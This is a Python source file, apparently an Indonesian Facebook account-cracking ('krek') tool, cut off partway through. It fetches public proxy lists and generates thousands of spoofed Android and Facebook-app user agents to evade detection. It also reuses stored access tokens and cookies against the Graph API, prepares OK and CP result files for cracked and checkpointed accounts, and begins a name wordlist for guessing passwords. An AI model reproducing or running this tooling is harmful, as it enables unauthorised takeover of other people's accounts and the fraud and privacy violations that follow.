import requests,bs4,json,os,sys,random,datetime,time,re,urllib3,rich,base64,subprocess,uuid
from time import sleep
import time
from rich import pretty
from rich.tree import Tree
from rich.panel import Panel
from rich import print as cetak
from rich import print as rprint
from rich import print as prints
from rich.progress import track
from rich.text import Text as tekz
from rich.console import Console
from rich.text import Text
from rich.columns import Columns
from rich.panel import Panel as nel
from rich.panel import Panel as panel
from bs4 import BeautifulSoup as sop
from bs4 import BeautifulSoup as par
from rich.console import Group as gp
from bs4 import BeautifulSoup as parser
from rich.columns import Columns as col
from rich.console import Console as sol
from rich.markdown import Markdown as mark
from concurrent.futures import ThreadPoolExecutor as tred
from concurrent.futures import ThreadPoolExecutor as BrayennnXD 
from rich.progress import Progress,SpinnerColumn,BarColumn,TextColumn
pretty.install()
CON=sol()
ses=requests.Session()
rr, rc = random.randint, random.choice
import os, platform, time, sys
#╭∩╮(︶.︶メ)[ RANDOM- USER-AGENT ](︶.︶メ)╭∩╮#
"Mozilla/5.0 (Linux; Android 11; Infinix X6816D Build/RP1A.201005.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/112.0.5615.136 Mobile Safari/537.36"
"Mozilla/5.0 (Linux; Android 11; Infinix X6812) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Mobile Safari/537.36"
"Mozilla/5.0 (Linux; Android 11; Infinix X689B Build/RP1A.200720.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/112.0.5615.132 Mobile Safari/537.36"
"Mozilla/5.0 (Linux; Android 8.1.0; Infinix X650 Build/O11019; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/70.0.3538.110 Mobile Safari/537.36"
"Mozilla/5.0 (Linux; Android 11; Infinix X697 Build/RP1A.200720.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/112.0.5615.101 Mobile Safari/537.36"
"Mozilla/5.0 (Linux; Android 12; Infinix X663) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Mobile Safari/537.36"
"Mozilla/5.0 (Linux; Android 11; Infinix X693 Build/RP1A.200720.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/112.0.5615.135 Mobile Safari/537.36"
"Mozilla/5.0 (Linux; Android 11; Infinix X695) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.5249.126 Mobile Safari/537.36"
"Mozilla/5.0 (Linux; Android 10; Infinix X690 Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/80.0.3987.99 Mobile Safari/537.36"
"Mozilla/5.0 (Linux; Android 12; Infinix X672 Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/112.0.5615.132 Mobile Safari/537.36"
"Mozilla/5.0 (Linux; Android 12; Infinix X676C Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/99.0.4844.88 Mobile Safari/537.36"
"Mozilla/5.0 (Linux; Android 12; Infinix X670 Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/112.0.5615.136 Mobile Safari/537.36"
"Mozilla/5.0 (Linux; Android 11; Infinix X6815) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.104 Mobile Safari/537.36"
"Mozilla/5.0 (Linux; Android 10; Infinix X687 Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/112.0.5615.135 Mobile Safari/537.36"
"Mozilla/5.0 (Linux; Android 12; Infinix X6821 Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36"
"Mozilla/5.0 (Linux; Android 7.0; Infinix HOT 4 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36"
"Mozilla/5.0 (Linux; Android 10; Infinix X680B Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/102.0.5005.78 Mobile Safari/537.36"
"Mozilla/5.0 (Linux; Android 11; Infinix X6815) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.104 Mobile Safari/537.36"
"Mozilla/5.0 (Linux; Android 11; Infinix X6810 Build/RP1A.200720.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/109.0.5414.117 Mobile Safari/537.36"
"Mozilla/5.0 (Linux; Android 11; Infinix X6811 Build/RP1A.200720.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/90.0.4430.210 Mobile Safari/537.36"
"Mozilla/5.0 (Linux; Android 5.1; Infinix-X600-LTE Build/LMY47D) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/39.0.0.0 Mobile Safari/537.36"
"Mozilla/5.0 (Linux; Android 5.1; Infinix NOTE 2 LTE Build/LMY47D) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/39.0.0.0 Mobile Safari/537.36"
"Mozilla/5.0 (Linux; Android 11; Infinix X689C Build/RP1A.200720.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/112.0.5615.136 Mobile Safari/537.36"
"Mozilla/5.0 (Linux; Android 12; Infinix X677 Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/99.0.4844.88 Mobile Safari/537.36"
"Mozilla/5.0 (Linux; Android 12; Infinix X671B Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/112.0.5615.136 Mobile Safari/537.36"
"Mozilla/5.0 (Linux; Android 12; Infinix X6820 Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/112.0.5615.135 Mobile Safari/537.36"
"Mozilla/5.0 (Linux; Android 8.1.0; Infinix X620) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Mobile Safari/537.36"
"Mozilla/5.0 (Linux; Android 8.1.0; Infinix X620B Build/OPM1.171019.026; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/112.0.5615.132 Mobile Safari/537.36"
"Mozilla/5.0 (Linux; Android 12; Infinix X676B Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/112.0.5615.136 Mobile Safari/537.36"
"Mozilla/5.0 (Linux; Android 10; Infinix X657B Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/80.0.3987.99 Mobile Safari/537.36"
"Mozilla/5.0 (Linux; arm; Android 12; Infinix X6823C) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 YaSearchBrowser/23.33.1 BroPP/1.0 YaSearchApp/23.33.1 webOmni SA/3 Mobile Safari/537.36"
"Mozilla/5.0 (Linux; Android 12; Infinix X6515 Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/113.0.5672.76 Mobile Safari/537.36"
ugen = (["Mozilla/5.0 (Linux; Android 8.0.0; SM-A520F Build/R16NW) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.66 Mobile Safari/537.36 YaApp_Android/10.41 YaSearchBrowser/10.41","Mozilla/5.0 (Linux; Android 8.0.0; SM-A520F Build/R16NW) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.82 Mobile Safari/537.36 YaApp_Android/11.10 YaSearchBrowser/11.10","Mozilla/5.0 (Linux; Android 7.0; SM-A520F Build/NRD90M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.84 Mobile Safari/537.36 YaApp_Android/10.44 YaSearchBrowser/10.44","Mozilla/5.0 (Linux; Android 7.0; SM-A520F Build/NRD90M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.93 Mobile Safari/537.36 YaApp_Android/9.80 YaSearchBrowser/9.80","Mozilla/5.0 (Linux; Android 8.0.0; SM-A520F Build/R16NW) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36 YaApp_Android/10.30 YaSearchBrowser/10.30","Mozilla/5.0 (Linux; Android 8.0.0; SM-A520F Build/R16NW) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.210 Mobile Safari/537.36 YaApp_Android/9.50 YaSearchBrowser/9.50"])
"Mozilla/5.0 (Linux; U; Android 7.0; nl-be; SM-A520F Build/NRD90M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/57.0.2987.132 Mobile Safari/537.36 PHX/9.3"
"Mozilla/5.0 (Linux; Android 8.0.0; SAMSUNG SM-A520F Build/R16NW) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/9.2 Chrome/96.0.4640.2 Mobile Safari/537.36"
"Mozilla/5.0 (Linux; Android 8.0.0; SAMSUNG SM-A520F Build/R16NW) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/9.2 Chrome/97.0.4669.77 Mobile Safari/537.36"
ugen2 = (["Mozilla/5.0 (Linux; Android 8.0.0; SM-A520F Build/R16NW) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.91 Mobile Safari/537.36 YaApp_Android/10.70 YaSearchBrowser/10.70","Mozilla/5.0 (Linux; Android 8.0.0; SM-A520F Build/R16NW) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.66 Mobile Safari/537.36 OPT/2.9","Mozilla/5.0 (Linux; Android 8.0.0; SM-A520F Build/R16NW) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.93 Mobile Safari/537.36 YaApp_Android/10.44 YaSearchBrowser/10.44"])
#╭∩╮(︶.︶メ)[ INDICATION-V1 ](︶.︶メ)╭∩╮#
pretty.install()
CON=sol()
ugen2=[]
ugen=[]
cokbrut=[]
ses=requests.Session()
princp=[]
from rich.console import Console
from rich.columns import Columns
wa = Console()
try:
  prox= requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http&timeout=10000&country=all&ssl=all&anonymity=all').text
  open('.prox.txt','w').write(prox)
except Exception as e:
  print('[\x1b[1;92m•\x1b[1;97m] [\x1b[1;96mERROR NOT FOUND 404 | No Internet !')
prox=open('.prox.txt','r').read().splitlines()
   
#╭∩╮(︶.︶メ)[ RANDOM ](︶.︶メ)╭∩╮#	    
for xd in range(10000):
	a='Mozile 5.0 (Linux; Android '
	b=random.randrange(1, 9)
	c=random.randrange(1, 9)
	d='Infinix X6823C)'
	e=random.randrange(100, 9999)
	f='Applewebkit/537. 36 (KHTML, Like Gecko) version/4.0 Chrome/'
	g=random.randrange(1, 9)
	h=random.randrange(1, 4)
	i=random.randrange(1, 4)
	j=random.randrange(1, 4)
	k='Mobile Safari/537.36'
	uaku=(f'{a}{b}.{c} {d}{e}{f}{g}.{h}.{i}.{j} {k}')
	ugen.append(uaku)

	a='Mozilla/5.0 (Linux; Android '
	b=random.randrange(1, 15)
	c=random.randrange(1, 15)
	d='Infinix X6815)'
	e=random.randrange(100, 9999)
	f='AppleWebKit/537.36 (KHTML, Like Gecko) version/4.0 Chrome/'
	g=random.randrange(1, 9)
	h=random.randrange(1, 4)
	i=random.randrange(1, 4)
	j=random.randrange(1, 4)
	k='Mobile Safari/537.36'
	uakuh=(f'{a}{b}.{c} {d}{e}{f}{g}.{h}.{i}.{j} {k}')
	ugen.append(uakuh)
	
	a='Mozilla/5.0 (Linux; Android '
	b=random.randrange(1, 15)
	c=random.randrange(1, 15)
	d='Infinix X6816D Build/RP1A.201005.001; wv)'
	e=random.randrange(100, 9999)
	f='AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
	g=random.randrange(1, 9)
	h=random.randrange(1, 4)
	i=random.randrange(1, 4)
	j=random.randrange(1, 4)
	k='Mobile Safari/537.36'
	uaku=(f'{a}{b}.{c} {d}{e}{f}{g}.{h}.{i}.{j} {k}')
	ugen.append(uaku)

for agenku in range(10000):
	a=random.choice(['8.0.0','6.0.1','7.1.1','8.1.0'])
	b=random.choice(['8.0.0','6.0.1','7.1.1','8.1.0'])
	c=random.randrange(73,100)
	d=random.randrange(4200,4900)
	e=random.randrange(40,150)
	uaku=f'Dalvik/1.6.0 (Linux; U; Android {a}; SM-A720F Build/R16NW){b}) [FBAN/Orca-Android;FBAV/196.0.0.29.99;FBPN/com.facebook.orca;FBLC/th_TH;FBBV/{c}.0.{d}.{e};FBCR/AIS;FBMF/samsung;FBBD/samsung;FBDV/SM-A720F;FBSV/8.0.0;FBCA/armeabi-v7a:armeabi;FBDM/'+'{density=3.0,width=1080,height=1920};FB_FW/1;]'
	ugen.append(uaku)	
	
	a=random.choice(['4.0.4','6.0.1','7.1.1','8.1.0'])
	b=random.choice(['4.0.4','6.0.1','7.1.1','8.1.0'])
	c=random.randrange(73,100)
	d=random.randrange(4200,4900)
	e=random.randrange(40,150)
	uakuh=f'Dalvik/2.1.0 (Linux; U; Android {a}; VOG-L29 Build/HUAWEIVOG-L29) [FBAN/Orca-Android;FBAV/272.0.0.14.119;FBPN/{c}.0.{d}.{e};FBLC/es_ES;FBBV/228977692;FBCR/vodafone ES;FBMF/HUAWEI;FBBD/HUAWEI;FBDV/VOG-L29;FBSV/10;FBCA/:'+'{density=3.0,width=1080,height=2265};FB_FW/1;] FBBK/1'
	ugen.append(uakuh)
	
	a=random.choice(['5.1.1','6.0.1','7.1.1','8.1.0'])
	b=random.choice(['5.1.1','6.0.1','7.1.1','8.1.0'])
	c=random.randrange(73,100)
	d=random.randrange(4200,4900)
	e=random.randrange(40,150)
	uaku=f'Dalvik/2.1.0 (Linux; U; Android {a}; Pixel 3 Build/SP1A.210812.016.C2){b}) [FBAN/Orca-Android;FBAV/412.0.0.15.69;FBPN/com.facebook.orca;FBLC/en_US;FBBV/{c}.0.{d}.{e};FBCR/Verizon;FBMF/Google;FBBD/google;FBDV/Pixel 3;FBSV/12;FBCA/arm64-v8a:null;FBDM/'+'{density=2.75,width=1080,height=2028};FBBK/1;FBLR/0;FB_FW/1;]'
	ugen.append(uaku)
	
	a=random.choice(['5.0','6.0.1','7.1.1','8.1.0'])
	b=random.choice(['5.0','6.0.1','7.1.1','8.1.0'])
	c=random.randrange(73,100)
	d=random.randrange(4200,4900)
	e=random.randrange(40,150)
	uaku=f'Dalvik/2.1.0 (Linux; U; Android {a}; CPH1909 Build/O11019){b}) [FBAN/FB4A;FBAV/43.0.0.29.147;FBPN/com.facebook.katana;FBLC/en_GB;FBBV/{c}.0.{d}.{e};FBCR/TRUE-H;FBMF/OPPO;FBBD/OPPO;FBDV/CPH1909;FBSV/8.1.0;FBCA/armeabi-v7a:armeabi;FBDM/'+'{density=2.0,width=1424,height=720};FB_FW/1;] FBBK/1'
	ugen.append(uaku)
	
	a=random.choice(['9','10','11','12','13','14','15'])
	b=random.choice(['9','10','11','12','13','14','15'])
	c=random.randrange(73,100)
	d=random.randrange(4200,4900)
	e=random.randrange(40,150)
	uaku=f'Mozilla/5.0 Infinix {a}; HOT 4 Pro) AppleWebKit/{b}) (KHTML, like Gecko) Chrome 79.0.3945.136 Mobile Safari/537.36{c}.0.{d}.{e};Mobile Safari/537.36'
	ugen.append(uaku)			
	
for xd in range(10000):
	aa='Mozilla/5.0 (Linux; Android '
	b=random.choice(['6','7','8','9','10','11','12'])
	c='Infinix X671B Build/SP1A.210812.016; wv)'
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.randrange(1, 999)
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g='AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
	h=random.randrange(73,100)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='Mobile Safari/537.36'
	uaku2=(f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}')
	ugen2.append(uaku2)
	
	aa='Mozilla/5.0 (Linux; Android'
	b=random.choice(['6','7','8','9','10','11','12'])
	c='Infinix X676B Build/SP1A.210812.016; wv)'
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.randrange(1, 999)
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g='AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
	h=random.randrange(73,100)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='Mobile Safari/537.36'
	uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
	ugen2.append(uaku2)
	
	aa='Mozilla/5.0 (Linux; Android'
	b=random.choice(['6','7','8','9','10','11','12'])
	c='Infinix X5514D Build/O11019; wv)D873A)'
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.randrange(1, 999)
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g='AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/78.0.4273.76'
	h=random.randrange(73,100)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='Mobile Safari/537.36[FBAN/EMA;FBLC/ar_AR;FBAV/347.0.0.17'
	uaku2=(f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}')
	ugen2.append(uaku2)
	
#╭∩╮(︶.︶メ)[ USER UGENT V3 ](︶.︶メ)╭∩╮#				
for xd in range(10000):
	aa='Mozilla/5.0 (Linux; Android '
	b=random.choice(['6','7','8','9','10','11','12'])
	c='moto g stylus 5G (2022) Build/S2SDS32.21-85-3-2-1-1; wv)'
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.randrange(1, 999)
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g='AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
	h=random.randrange(73,100)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='Mobile Safari/537.36'
	uaku2=(f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}')
	ugen2.append(uaku2)
	
	aa='Mozilla/5.0 (Linux; Android'
	b=random.choice(['6','7','8','9','10','11','12'])
	c='SM-A520F Build/R16NW)'
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.randrange(1, 999)
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g='AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
	h=random.randrange(73,100)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='Mobile Safari/537.36'
	uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
	ugen2.append(uaku2)
	
	aa='Mozilla/5.0 (Linux; Android'
	b=random.choice(['6','7','8','9','10','11','12'])
	c='Infinix-X600-LTE Build/LMY47D)'
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.randrange(1, 999)
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g='AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
	h=random.randrange(73,100)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='Mobile Safari/537.36[FBAN/EMA;FBLC/ar_AR;FBAV/347.0.0.17'
	uaku2=(f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}')
	ugen2.append(uaku2)

for x in range(10):
	a='Mozilla/5.0 (Linux; Android'
	b=random.randrange(100, 9999)
	c=random.randrange(100, 9999)
	d='V2111'
	e=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	h=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	i=random.randrange(1, 9)
	j='AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
	k=random.randrange(1, 9)
	l=random.randrange(1, 9)
	m='Mobile Safari/537.36'
	uak=f'{a}{b}/{c}{d}{e}{f}{g}{h}{i}{j}.{k} {l}'
	
	a=random.choice(['6','7','8','9','10','11','12'])
	b=random.choice(['6','7','8','9','10','11','12'])
	c=random.randrange(73,100)
	d=random.randrange(4200,4900)
	e=random.randrange(40,150)
	uak=f'Mozilla/5.0 (Linux; Android {a}; Pixel {b}) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{c}.0.{d}.{e} Mobile Safari/537.36'
def uaku():
	try:
		ua=open('bbnew.txt','r').read().splitlines()
		for ub in ua:
			ugen.append(ub)
	except:
		a=requests.get('https://github.com/EC-1709/a/blob/main/bbnew.txt').text
		ua=open('.bbnew.txt','w')
		aa=re.findall('line">(.*?)<',str(a))
		for un in aa:
			ua.write(un+'\n')
		ua=open('.bbnew.txt','r').read().splitlines()
ua = random.choice(['Dalvik/2.1.0 (Linux; U; Android 4.5 SM-G900F Build/LRX21T)1239[FBAN/FB4A;FBAV/43.0.0.29.147;FBPN/com.facebook.katana;FBLC/en_GB;FBBV/4.2.3.3 ;FBCR/Tele2 LT;FBMF/samsung;FBBD/samsung;FBDV/SM-G900F;FBSV/5.0;FBCA/armeabi-v7a:armeabi;FBDM/'+'{density=3.0,width=1080,height=1920};FB_FW/1;]','Dalvik/1.6.0 (Linux; U; Android 3.2 SM-A720F Build/R16NW)4487[FBAN/Orca-Android;FBAV/196.0.0.29.99;FBPN/com.facebook.orca;FBLC/th_TH;FBBV/3.3.2.3;FBCR/AIS;FBMF/samsung;FBBD/samsung;FBDV/SM-A720F;FBSV/8.0.0;FBCA/armeabi-v7a:armeabi;FBDM/'+'{density=3.0,width=1080,height=1920};FB_FW/1;]','Dalvik/1.6.0 (Linux; U; Android 3.7 GT-I9300 Build/IMM76D)8589[FBAN/Orca-Android;FBAV/5.0.0.16.1;FBLC/tr_TR;FBBV/3.2.3.1;FBCR/T-Mobile;FBMF/samsung;FBBD/samsung;FBDV/GT-I9300;FBSV/4.0.4;FBCA/armeabi-v7a:armeabi;FBDM/'+'{density=1.0,width=1066,height=552};]'])
#╭∩╮(︶.︶メ)[ INDICATION V2 ](︶.︶メ)╭∩╮#
id,id2,loop,ok,cp,akun,oprek,method,lisensiku,taplikasi,tokenku,uid,lisensikuni= [],[],0,0,0,[],[],[],[],[],[],[],[]
cokbrut=[]
ualuh,ualu = [],[]
pwpluss,pwnya=[],[]
#------------[ WARNA-COLOR ]--------------#
P = '\x1b[1;97m'
M = '\x1b[1;91m'
H = '\x1b[1;92m'
K = '\x1b[1;93m'
B = '\x1b[1;94m'
U = '\x1b[1;95m' 
O = '\x1b[1;96m'
N = '\x1b[0m'    
Z = "\033[1;30m"
sir = '\033[41m\x1b[1;97m'
### ----- [ Warna Kode Unik Rich ] ----- ###
P2 = "[#5cbfaa]"
H2 = "[#00FF00]"
M2 = "[#FF0000]"
U2 = "[bold purple]"
K2 = "[#FFFF00]"
A2 = "[#555555]"
C2 = "[bold cyan]"
x = '\33[m' # DEFAULT
m = '\x1b[1;91m' #RED +
k = '\033[93m' # KUNING +
h = '\x1b[1;92m' # HIJAU +
hh = '\033[32m' # HIJAU -
u = '\033[95m' # UNGU
kk = '\033[33m' # KUNING -
b = '\33[1;96m' # BIRU -
p = '\x1b[0;34m' # BIRU +
asu = random.choice([m,k,h,u,b])
sys.stdout.write('\x1b]2; PRA-XD\x07')
#--------------------[ CONVERTER-BULAN ]--------------#
dic = {'1':'January','2':'February','3':'March','4':'April','5':'May','6':'June','7':'July','8':'August','9':'September','10':'October','11':'November','12':'December'}
dic2 = {'01':'January','02':'February','03':'March','04':'April','05':'May','06':'June','07':'July','08':'August','09':'September','10':'October','11':'November','12':'Devember'}
tgl = datetime.datetime.now().day
bln = dic[(str(datetime.datetime.now().month))]
thn = datetime.datetime.now().year
okc = 'OK-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'
cpc = 'CP-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'
#------------------[ MACHINE-SUPPORT ]---------------#
def had1xd_xy(u):
        for e in u + "\n":sys.stdout.write(e);sys.stdout.flush();time.sleep(0.005)
def clear():
	os.system('clear')
def back():
	login()
#------------------[ LOGO-LAKNAT ]-----------------#
def banner():
	clear()
	cetak(nel(f"""
{A2}██████    ██████    ██████
{A2}██      ██    ██               ██      ██
{A2}██████    ██               ██____██
{A2}██                ██              ██        ██
{A2}██                ██              ██        ██
                                            
    {A2}JANGAN DI JUAL SCNYA WIR{A2} {M2}JADI{M2} {A2}GUNAKAN BUAT PRIBADIMU AJA{A2}                 
[white]                  	""",width=70,title=f"[bold green]Premium",subtitle=f"[bold green]MENU",style=f"bold green")) 

#--------------------[ BAGIAN-MASUK ]--------------#
def login():
	try:
		token = open('.tonken.txt','r').read()
		cok = open('.coonk.txt','r').read()
		tokenku.append(token)
		try:
			sy = requests.get('https://graph.facebook.com/me?fields=id,name&access_token='+tokenku[0], cookies={'cookie':cok})
			sy2 = json.loads(sy.text)['name']
			sy3 = json.loads(sy.text)['id']
			menu(sy3,sy2)
		except KeyError:
			login1()
		except requests.exceptions.ConnectionError:
			print('└──  Internet Anda Tidak Terkoneksi, Periksa Dan Coba Lagi !')
			exit()
	except IOError:
		login1()
def loginkrek():
  clear();banner()
  cetak(panel(f"[white][[green]01[white]].[blue]Login Dengan cookie [white][[green]02[white].[blue]Krek No Login",width=70,style=f"{color_panel}"))
  znb = input('Pilih : ')
  if znb in ['01','1']:login1()
  if znb in ['02','2']:crack_email()
def crack_email():
	rc = random.choice
	rr = random.randint
	bas = ['nazri','nizar','reni','aidil','yusup','yusep','sidik','encas','erika','rika','agil','lang','ling','lung','ani','keyla','septi','cepi','galuh','rona','ronaldo','ado','deon','ratu','ara','nia','nina','panji','heru','gaga','ega','agnes','ilma','puji','pujia','uji','hesti','reksa','bulan','alip','alif','sahri','raisa','mela','mella','cucu','ria','sarah','bunga','vina','cia','tiya','candra','bilal','fatimah','arya','kevin','bima','nurul','suparhan','ahmad','mahmud','asep','ramdan','saputra','kurnia','ramdani','hilda','mita','miya','ayu','gopur','tia','bono','mutiara','arin','wawan','winda','penita','iyus','herlan','dinda','nda','naya','niya','aca','bandros','refan','wapda','rahman','maman','mimin','fitrah','adit','adat','fiki','aulia','tata','enung','esih','jajang','febi','ismi','wida','sanji','regi','rega','ferdi','firman','jimi','mawar','ratna','dimas','sasa','tia','tini','medusa','dewi','winda','setia','putri','danil','galang','gilang','denis','deni','sela','nabil','sinta','amel','melia','putra','telor','sabun','nia','kira','mela','mila','lisa','lida','lidi','ali','jaya','kiki','pian','pita','juwita','junita','nita','anisa','nisa','sani','sari','uje','uji','olip','oli','fikar','nur','siti','eli','oji','rada','imas','mia','tuti','tia','ima','sendi','febian','rima','raka','rati','jiman','dodi','reza','yani','galih','hia','siva','opik','kamal','jamal','linda','lida','ida','adi','andi','dwi','muhammad','nur','dewi','tri'